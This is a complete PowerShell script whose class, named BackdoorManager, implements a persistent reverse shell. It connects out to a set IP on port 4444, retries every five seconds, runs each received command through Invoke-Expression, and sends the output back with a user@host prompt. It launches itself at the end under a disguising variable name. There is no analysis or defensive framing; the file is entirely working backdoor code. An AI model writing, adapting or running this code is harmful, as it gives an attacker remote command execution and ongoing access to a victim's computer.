
    class BackdoorManager {
    
    [string]$UserDefinedIPAddress = "0.0.0.0"
    [int]$UserDefinedPort = 4444;

    $activeStream;
    $activeClient;
    $sessionWriter;
    $textBuffer;
    $sessionReader;
    $textEncoding;
    [int]$readCount = 50*1024;

    waitForConnection() {
        $this.activeClient = $false;
        while ($true) {
            try {
                $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
                break;
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5;
            }
        }
        $this.createTextStream();
    }

    createTextStream() {
        $this.activeStream = $this.activeClient.GetStream();
        $this.textBuffer = New-Object Byte[] $this.readCount;
        $this.textEncoding = New-Object Text.UTF8Encoding;
        $this.sessionWriter = New-Object IO.StreamWriter($this.activeStream, [Text.Encoding]::UTF8, $this.readCount);
        $this.sessionReader = New-Object System.IO.StreamReader($this.activeStream);
        $this.sessionWriter.AutoFlush = $true;

    }

    createBackdoorConnection() {
        $this.waitForConnection();
        $this.handleActiveClient();

    }

    writeToStream($content) {
        try {
            [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content);
            $this.sessionWriter.Write($bytes,0,$bytes.length);   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.createBackdoorConnection();
        }
    }

    [string] readFromStream() {
        try {
            $rawResponse = $this.activeStream.Read($this.textBuffer, 0, $this.readCount)    
            $response = ($this.textEncoding.GetString($this.textBuffer, 0, $rawResponse))
            return $response;
            } catch [System.Management.Automation.MethodInvocationException] {
                $this.createBackdoorConnection();
                return "";
        }
    }

    [string] getCommand($command) {
        Write-Host  $command;
        try { 
            if ($command -match "function") {
                Invoke-Expression $command 
                return "";
                }  else {
                $output = Invoke-Expression $command | Out-String
            }
        } catch {
            $e = $_.Exception
            $msg = $e.Message
            $output = "`n$e`n"  
        }
        return $output;
    }

    [string] createPrompt() {
        $currentUser = [Environment]::UserName;
        $computerName = [System.Net.Dns]::GetHostName();
        $pwd = Get-Location;
        return "$currentUser@$computerName [$pwd]~$ ";
    }

    handleActiveClient() {
        while ($this.activeClient.Connected) {
            $this.writeToStream($this.createPrompt())         
            $response = $this.readFromStream();
            $output = "`n"
            if ([string]::IsNullOrEmpty($response)) {
                continue
            }
            $output = $this.getCommand($response);
            $this.writeToStream($output + "`n")
            $this.activeStream.Flush()
        }
            $this.activeClient.Close()
        $this.createBackdoorConnection();
    } 
}

$nothingtolookatreally = [BackdoorManager]::new()
$nothingtolookatreally.createBackdoorConnection()
